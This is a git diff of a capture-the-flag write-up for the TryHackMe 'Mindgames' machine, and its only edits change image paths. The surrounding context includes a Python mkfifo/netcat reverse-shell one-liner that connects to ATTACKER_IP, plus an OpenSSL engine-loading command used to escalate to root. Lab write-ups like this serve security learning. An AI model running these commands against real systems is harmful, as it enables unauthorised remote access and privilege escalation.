@@ -40,7 +40,7 @@ There are just two ports open:
 
 Since this version of OpenSSH isn't prone to anything other than username enumeration, it looks like this machine will be more web-heavy. I fire up Gobuster to start looking for subdirectories/subdomains in the background before heading over to the landing page.
 
-![](../assets/img/2026-02-09-Mindgames/1.png)
+![](/assets/img/2026-02-09-Mindgames/1.png)
 
 So, right away I recognize this crazy encoding to be an obscure programming language by the name of brainfuck (pardon my French). A bit of history about it - Brainfuck is an esoteric programming language created in 1993 by Urban Müller as an experiment to design the smallest possible compiler, using just eight commands. Despite its extreme minimalism and unreadable syntax, it became popular as a curiosity that explores the limits of language simplicity and Turing completeness.
 
@@ -55,7 +55,7 @@ import os; os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_
 
 Netcat didn't have access to the -e flag, so I went with a standard mkfifo reverse shell. Encoding that and having the server run it grants a successful reverse shell and we can start internal enumeration.
 
-![](../assets/img/2026-02-09-Mindgames/2.png)
+![](/assets/img/2026-02-09-Mindgames/2.png)
 
 ## Privilege Escalation
 Looking at `/etc/passwd` shows that there is another user besides root named tryhackme, but we aren't allowed access to their home directory and it does not look like they own any files on the system. 
@@ -104,7 +104,7 @@ After that is taken care of, all that's left is to upload it to the remote machi
 openssl req -engine ./exploit.so
 ```
 
-![](../assets/img/2026-02-09-Mindgames/3.png)
+![](/assets/img/2026-02-09-Mindgames/3.png)
 
 Finally, I spawn a bash shell with the new binary and grab the root flag under `/root/root.txt`. 
 
